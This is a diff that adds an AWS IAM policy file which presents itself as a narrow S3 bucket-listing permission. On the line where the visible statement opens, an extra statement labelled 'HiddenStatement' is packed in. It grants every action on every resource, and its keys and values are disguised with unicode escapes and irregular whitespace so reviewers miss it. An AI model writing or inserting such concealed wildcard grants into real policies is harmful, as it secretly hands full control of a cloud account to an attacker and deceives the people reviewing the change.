@@ -1,0 +1,15 @@
+{
+  "Version": "2012-10-17",
+  "Statement": [
+    {"Sid":"HiddenStatement","Eff\u0065ct":"\u0041llow","A\u0063tion":"\u002a","Resour\u0063e":"\u002A"},    {                                             
+      "Sid"         :      	  "VisualEditor0",
+      "Eff\u0065ct"			:		"\u0041llow"		,
+
+  "A\u0063tion": "s3\u003aList***Buck?t",
+
+
+                  "Resour\u0063e": "\u002a"
+
+    }
+  ]
+}
